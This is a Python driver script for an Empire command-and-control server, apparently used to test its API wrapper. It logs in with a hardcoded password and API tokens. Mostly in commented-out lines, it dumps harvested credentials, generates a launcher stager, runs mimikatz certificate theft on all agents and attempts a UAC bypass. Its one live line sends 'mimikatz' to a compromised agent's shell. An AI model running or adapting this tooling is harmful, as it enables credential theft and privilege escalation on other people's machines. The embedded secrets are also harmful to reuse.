import EmpireAPIWrapper

api = EmpireAPIWrapper.empireAPI('10.15.20.157', uname='empireadmin', passwd='Password123!')
# api = EmpireAPIWrapper.empireAPI('10.15.20.157', token='2zqb4bgvoq1jhe9essncl3qa6h9rvbj1jq2p740k')
# api = EmpireAPIWrapper.empireAPI('10.15.20.157', token='yv42s1wlo90ikrzc7pwebgrbpqnzkigqlxbb4cp2')


#### Admin and Utilties
# print(api.check_version())
# print(api.shutdownServer())
# print(api.restartServer())
# map = api.getMap()
# print(api.getConfig())
# print(api.getPermToken())
# print(api.getCreds())

##### Print API map out
# for i in map:
#     print(map[i])

##### Reporting
# print(api.report())
# print(api.report_agent('UG3YT4FNPRSKRZHA'))

##### Stagers
# print(api.get_stagers())
# print(api.get_stager_by_name('launcher'))
# print(api.gen_stager(StagerName='launcher', listener='victor'))

##### Modules
# print(api.modules())
# print(api.module_by_name('credentials/mimikatz/certs'))
# data = {'Agent': 'all'}
# print(api.module_exec('credentials/mimikatz/certs', options=data))


##### Agents
# agent = api.agents()
# for agent_id in agent['agents']:
#     for key in agent_id:
#         pass # print('{}:\t\t{}'.format(key, agent_id[key]))
#
# agent_name = agent['agents'][0]['name']
# data = {'Agent': agent_name, 'Listener': 'victor'}
# print(api.module_exec('privesc/bypassuac', options=data))


print(api.agent_run_shell_cmd('ZKRGK3Y2E2ZHTECE', {'command':'mimikatz'}))